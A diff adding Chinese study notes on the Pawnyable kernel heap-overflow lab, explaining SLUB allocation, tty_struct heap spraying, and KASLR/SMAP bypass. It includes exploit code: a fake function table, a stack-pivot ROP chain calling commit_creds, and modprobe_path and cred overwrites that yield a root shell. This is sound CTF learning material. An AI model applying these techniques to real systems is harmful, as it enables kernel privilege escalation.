@@ -103,3 +103,175 @@ mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0
 _copy_from_user和_copy_to_user与copy_from_user和copy_to_user的区别在于前者不会对复制的长度进行检查，易导致溢出
 
 ## [040202 Pawnyable之堆溢出](https://blog.wohin.me/posts/pawnyable-0202/)
+
+因为我是一边看一边写的笔记，导致写完才发现这篇全是干货，这笔记精简基本精简了个寂寞。建议看原文，我这里只标了一点自己不理解的地方
+
+在内核中，可以使用mmap以页（page）为基本单位进行内存分配，但是这会导致很多空间浪费。因此，与用户空间中的malloc函数类似，可以在内核中使用kmalloc函数申请内存。kmalloc使用了内核中的分配器，主要有SLAB、SLUB和SLOB三种。这三个分配器之间并不是完全独立的，在实现上有共同的部分，统称为Slab（厚板）分配器。其中：
+1. SLAB是以上三者中最古老的分配器类型，在Linux中的代码实现位于mm/slab.c。
+2. SLUB的意思是the unqueued slab allocator，它的特点是尽可能快，在Linux中的代码实现位于mm/slub.c。自2.6.23版本后，Linux内核用SLUB取代SLAB，作为默认的内存分配器
+3. SLOB的意思是simple list of blocks，特点是尽可能轻量，在Linux中的代码实现位于mm/slob.c。
+
+SLAB分配器有以下三个特点：
+1. 根据所需内存大小使用不同的页框。与libc malloc的内存分配方式不同，SLAB根据内存需求的大小分配来自不同区域的内存。因此，分配的内存块前后没有（不需要）长度信息。
+2. 使用缓存。对于小内存的分配情况，优先使用对应的缓存。如果所需的内存很大，或者缓存为空，则采用正常的分配机制。
+3. 使用位图管理已释放区域。在内存页的顶部维护了一个位数组，用于表示该页是否已释放特定索引的区域。与libc malloc的内存管理方式不同，它并未基于链表管理。
+
+在实际使用中，会有多个内存块作为缓存，已释放的区域将被优先使用。__kmem_cache_create函数还可以根据相关标志进行以下设置：
+- SLAB_POISON：将已释放区域用0xA5填充。
+- SLAB_RED_ZONE：在每个对象后添加一个redzone区域，用来检测堆溢出。
+
+SLUB分配器有以下三个特点：
+1. 与SLAB类似，SLUB根据所需内存大小使用不同的页框（kmalloc-64、kmalloc-128、kmalloc-256等等）。不同的是，SLUB管理的页框的开头没有元数据（如空闲区索引）。页框描述符中有指向空闲链表开头的指针。
+2. 与libc的tcache和fastbin类似，SLUB使用单向链表管理空闲区域。
+3. 与SLAB类似，每个CPU都有一个cache，但是SLUB同样是用单向链表来维护它们的。
+
+其中，通用kmem_cache的大小覆盖了8、16、32、64、96、128、192、256、512、1024、2048、4096和8192。SLUB还提供了sanity checks、red zoning和poisoning等debug功能
+
+内核堆由所有驱动程序和内核共享。因此，一个驱动程序中的漏洞可用于破坏内核空间中的另一个对象。那么，一个非常自然的思路是想办法在脆弱对象后面放一些想要破坏的目标对象，从而通过堆溢出篡改这些目标对象。如前所述，SLUB管理的对象之间没有元数据，因此不必考虑堆溢出可能会破坏这些元数据。
+
+堆溢出的一种常见利用手法是堆喷（[Heap Spraying](https://en.wikipedia.org/wiki/Heap_spraying) ），它能够提高堆溢出漏洞利用的成功率和稳定性。所谓堆喷，就是在堆上（无论是内核堆还是用户态堆）大量申请内存，并填充特定载荷。堆喷是一种通用的漏洞利用辅助技术，并不局限在堆溢出漏洞利用中。以下是两种堆喷利用场景：
+1. 在用户态PWN中，利用某个漏洞能够将控制流劫持到堆上。在这种情况下，可以通过堆喷“nop雪橇（应该指往堆里面放一堆nop，然后劫持控制流到这，让其滑到shellcode）+shellcode”的方式对堆进行布局，使得劫持的目标堆地址大概率命中nop雪橇部分，从而抵消掉相当一部分随机化导致的不确定性，实现代码执行。
+2.  在内核态PWN中，堆溢出漏洞的利用。在这种情况下，利用系统调用或漏洞模块交互，在堆上放置大量脆弱对象及一些目标对象，使得脆弱对象中的堆溢出漏洞被触发时，大概率其后是一个目标对象，实现对目标对象的篡改。
+
+SLUB的特性决定了只有大小相同的对象才会从同一个kmem_cache区域分配，因此我们要根据脆弱对象的大小来选择目标对象。关于目标对象的选择： https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628
+
+若漏洞模块每次申请的内存大小为0x400，我们需要找到一个同样从kmalloc-1024区域分配的内核对象。比如tty_struct（大小通常在0x2c0左右），其定义在 https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143
+```c
+struct tty_struct {
+int magic;
+struct kref kref;
+struct device *dev; /* class device or NULL (e.g. ptys, serdev) */
+struct tty_driver *driver;
+const struct tty_operations *ops;
+    // ...
+} __randomize_layout;
+```
+其中，tty_operations *ops在结构体中的偏移是0x18，它包含了相关的操作函数，定义在[drivers/tty/pty.c](https://elixir.bootlin.com/linux/v5.15/source/drivers/tty/pty.c) 中。例如，当我们对/dev/ptmx执行open系统调用时，对应的操作函数[ptmx_open](https://elixir.bootlin.com/linux/v5.15/source/drivers/tty/pty.c#L788) 将被执行：
+```c
+int ptmx = open( "/dev/ptmx" , O_RDONLY | O_NOCTTY);
+```
+用堆喷手法成功布置内核堆后，通常利用堆溢出漏洞篡改目标对象的特定函数指针，或者伪造一个函数指针表，然后在用户空间对目标对象执行系统调用，从而触发它的相应操作函数，由于该函数指针已经被篡改为一个恶意的地址，内核控制流将被劫持
+
+堆喷例子：
+```c
+int main() {
+    int spray[100];
+    for (int i = 0; i < 50; i++)
+        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+    int fd = open("/dev/holstein", O_RDWR);
+    for (int i = 50; i < 100; i++)
+        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+    char buf[0x500];
+    memset(buf, 'A', 0x500);
+    write(fd, buf, 0x500);
+}
+```
+在内核堆上喷射了50个tty_struct结构体，然后漏洞模块在堆上申请了0x400大小的内存空间，最后又喷射了50个tty_struct结构体。这样一来，有很大概率出现这样的堆布局：漏洞模块的0x400大小的g_buf缓冲区前后都是tty_struct结构体。
+
+如果在gdb里查看内存布局，就会发现若干个tty_struct把漏洞模块的堆buf夹在中间。此时若触发堆溢出漏洞，溢出的内容就会覆盖后面tty_struct结构体的内容。此为前面提到的“利用堆溢出漏洞篡改目标对象的特定函数指针”
+
+绕过kaslr：堆喷后，利用越界读读出紧跟在堆buf后面的tty_struct的函数指针（如偏移0x18处的`tty_operations *ops`）然后计算出基地址
+
+可以伪造一个tty_operations函数表，然后利用堆溢出将堆上的tty_struct结构体中的*ops修改为这张伪造的函数表。如果目标环境没有开启SMAP，那么可以选择在用户空间放置伪函数表。然而smap阻止了这一行为（作者其实没写出如何绕过smap）,只有堆是我们能够向内核空间写入数据的地方，因此需要泄露堆地址（刚刚泄露的地址是kaslr的，代码段的地址）
+
+tty_struct偏移0x38处的值是一个堆地址。可利用此地址计算漏洞模块堆buf地址，然后在buf中放置伪函数表，修改tty_struct的*ops指针指向buf。最后在用户空间中使用ioctl系统调用来触发控制流劫持，相应地，RIP将转到伪造函数表中的对应指针处。可以先伪造一个存储非法指针的函数表，让内核崩溃，弄清楚具体是函数表中第几个函数被调用了。
+```c
+g_buf = *(unsigned long *)&buf[0x438] - 0x438;
+// craft fake function table
+unsigned long *p = (unsigned long *)&buf;
+for (int i = 0; i < 0x40; i++)
+    *p++ = 0xffffffffdead0000 + (i << 8);
+*(unsigned long *)&buf[0x418] = g_buf;
+write(fd, buf, 0x420);
+// hijack control flow
+for (int i = 0; i < SPRAY_NUM; i++)
+    ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
+```
+由于我们不知道堆溢出后究竟覆盖了哪个tty_struct，因此在上述代码末尾选择对所有喷射的对象执行ioctl。然而，有时能够在用户空间通过执行某些系统调用来确定被堆溢出修改的对象，这样就不必遍历所有对象了，稳定性也更高。
+
+执行exp，kernel会崩溃并返回`BUG: unable to handle page fault for address:`，后面跟着的地址就是ioctl对应的tty_operations中的处理函数（像上面的代码一样构造函数能得到函数的索引）
+
+在SMEP开启但SMAP关闭的情况下，不一定非要搞内核态ROP，利用栈迁移搞用户态ROP即可。使用ropr搜索stack pivoting的gadget：`ropr --nouniq -R "^mov esp, 0x[0-9]*; ret" ./vmlinux`。然后根据mov esp的操作数提前用mmap申请到从那块开始的内存，在这里写入rop链，利用之前的堆溢出将控制流劫持到gadget的地址即可
+
+然而在SMAP开启的情况下，不能将stack给pivot到用户空间（mmap那个做法就用不了了），此时希望pivot到堆上，最好是堆buf这部分能控制的内核内存。这道题在执行ioctl使内核崩溃时，rcx寄存器和rdx寄存器里分别包含了ioctl的第二个，第三个参数。因此可以找类似`mov rsp, rcx; ret`的gadget（或者先push再pop的gadget：`ropr --nouniq -R "^push rdx;.* pop rsp;.* ret" ./vmlinux`）
+
+可以将ROP链布置在内核堆内存buf中，在伪函数表项前或表后均可，甚至相互穿插也可以，用pop跳过即可。这里我解释一下exp的关键部分，差点没看懂（问就是基础太垃圾了）
+```c
+int main() {
+    unsigned long *chain = (unsigned long *)&buf;
+    *chain++ = pop_rdi_ret;               // #0 return address。第一次0xc调用后会从这里开始执行
+    *chain++ = 0x0;                       // #1
+    *chain++ = prepare_kernel_cred;       // #2
+    *chain++ = pop_rcx_ret;               // #3
+    *chain++ = 0;                         // #4
+    *chain++ = mov_rdi_rax_rep_movsq_ret; // #5
+    *chain++ = commit_creds;              // #6
+    *chain++ = pop_rcx_ret;               // #7 这些pop_rcx_ret估计都是用来填充的，让push_rdx_pop_rsp_pop2_ret正好在0xc
+    *chain++ = 0;                         // #8
+    *chain++ = pop_rcx_ret;               // #9
+    *chain++ = 0;                         // #a
+    *chain++ = pop_rcx_ret;               // #b 这个除外，当我们从上到下执行后，下一个push_rdx_pop_rsp_pop2_ret会被pop进rcx，让我们不至于再来一次
+    *chain++ = push_rdx_pop_rsp_pop2_ret; // #c，后面ioctl调用的其实是这里。这个gadget为push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret; 。rdx是g_buf - 0x10，然后pop rsp，把g_buf - 0x10放入rsp。至于为什么是g_buf - 0x10，因为后面有两个无用的pop。会抬高堆栈0x10。g_buf - 0x10经过两次pop后正好到chain的开始
+    *chain++ = swapgs_restore_regs_and_return_to_usermode; //很巧妙地跳过了上一个，直接到kpti trampoline
+    *chain++ = 0x0;
+    *chain++ = 0x0;
+    *chain++ = user_rip;
+    *chain++ = user_cs;
+    *chain++ = user_rflags;
+    *chain++ = user_sp;
+    *chain++ = user_ss;
+    *(unsigned long *)&buf[0x418] = g_buf; //计算得到偏移0x418处是函数表指针
+    printf("[*] overwriting the adjacent tty_struct\n");
+    write(fd, buf, 0x420); //往漏洞模块越界写ropchain以及覆盖函数表指针
+    printf("[*] invoking ioctl to hijack control flow\n");
+    // hijack control flow
+    for (int i = 0; i < SPRAY_NUM; i++) {
+        ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); //ioctl会导致tty_struct函数表的第0xc个函数被调用.其第三个参数g_buf - 0x10会被传入rdx
+        //这里要是ioctl第二个参数设置为0xdeadbeef，root shell退出后内核会崩溃。改成0就好了
+    }
+}
+```
+并不是所有情况下都能做stack pivoting，需要考虑内核是否有相应的gadget、是否有能够控制的空间和是否能够把可控空间的地址传递给gadget等多个因素。
+
+除了ROP之外，如果拥有内核的任意地址读（arbitrary address read，简称AAR）和任意地址写（arbitrary address write，简称AAW）的能力，也能实现提权。这里指的是可以直接使用AAW的相关gadget（[原语](https://www.cnblogs.com/hualalasummer/p/3704225.html),个人认为指的是某个视角上的“最小单位”）来进行漏洞利用，不去构造ROP链。参考 https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html
+
+AAW原语：`mov [rdx], rcx; ret;`;AAR原语：`mov eax, [rdx]; ret;`。所以这里原语可能指“一句汇编指令”。结合执行ioctl时rcx和rdx可控，就能利用AAW通过两种不同的方式实现提权：修改usermode helpers和修改当前进程的cred结构体。
+
+先是利用AAW来修改modprobe_path实现提权。有可能出现当前环境中的内核没有在/proc/kallsyms中暴露modprobe_path的情况，还能用pwntools找偏移：
+```py
+from pwn import *
+elf = ELF('./vmlinux')
+print(hex(next(elf.search(b'/sbin/modprobe\x00'))))
+```
+这里提一嘴作者在modprobe这段使用的exp。参考另一篇[笔记](./kernel技巧学习.md)，modprobe可用来以root身份执行某个命令，但不是完整的root shell（我怀疑换种写法就可以了）。在作者提到的[文章](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/#version-3-probing-the-mods)里搜索dropper就能看到完整思路。过程简述如下：
+1. 写一个微型elf，执行内容为`setuid(0); setgid(0); execve("/bin/sh", ["/bin/sh"], NULL)`，然后编译获取其机器码
+2. 创建dropper，作用为打开一个文件，往里面写入刚才微型elf的机器码，关闭文件，然后更改其权限。同样编译获取其机器码
+3. 拿dropper的机器码，写入`/tmp/w`文件，并将modprobe_path覆盖为`/tmp/w`。然后随便写一个文件头未知的文件，用来触发modprobe
+4. 触发modprobe后，执行微型elf即可获得root shell
+
+个人感觉有点多此一举（为啥不直接拿root shell，还要来个dropper？难道是不行？），但我的水平不高，不下定论。
+
+如果能够将当前进程中cred结构体的各种ID重写为0，理论上就能提权到root。现在的问题是如何获取自身进程结构体地址。在版本较旧的内核中，全局符号current_task能够用来找到当前进程的task_struct。然而，新版本内核中它已经不是全局变量，而是存储在每个CPU空间中，需要使用GS寄存器访问。可以使用AAR搜索内核堆来寻找当前进程的cred结构体。
+
+cred结构体指针在[task_struct结构体](https://elixir.bootlin.com/linux/v5.15/source/include/linux/sched.h#L723)里，后面还有个comm数组保存了当前进程的名称
+```c
+	/* Effective (overridable) subjective task credentials (COW): */
+	const struct cred __rcu		*cred;
+#ifdef CONFIG_KEYS
+	/* Cached requested key. */
+	struct key			*cached_requested_key;
+#endif
+	/*
+	 * executable name, excluding path.
+	 *
+	 * - normally initialized setup_new_exec()
+	 * - access it with [gs]et_task_comm()
+	 * - lock it with task_lock()
+	 */
+	char				comm[TASK_COMM_LEN];
+```
+可以将当前进程名称利用prctl函数设置为一个内核中不太常见的字符串，然后利用AAR在堆上搜索这个字符串，找到comm，进而找到cred指针。找到cred指针后，就可以利用AAW将[cred结构体](https://elixir.bootlin.com/linux/v5.15/source/include/linux/cred.h#L110)中的各种ID重写为0。
+
+[exp](https://gist.github.com/brant-ruan/5fc95dbcdde06c188013d11a859113c0)会有几次堆喷不奏效的情况，不过成功率还可以。
+
+如果只是为了提升权限，那么简单利用AAW去修改usermode helpers、cred结构体等已经足够；如果目的是容器逃逸，那么修改这些数据结构是不够的。
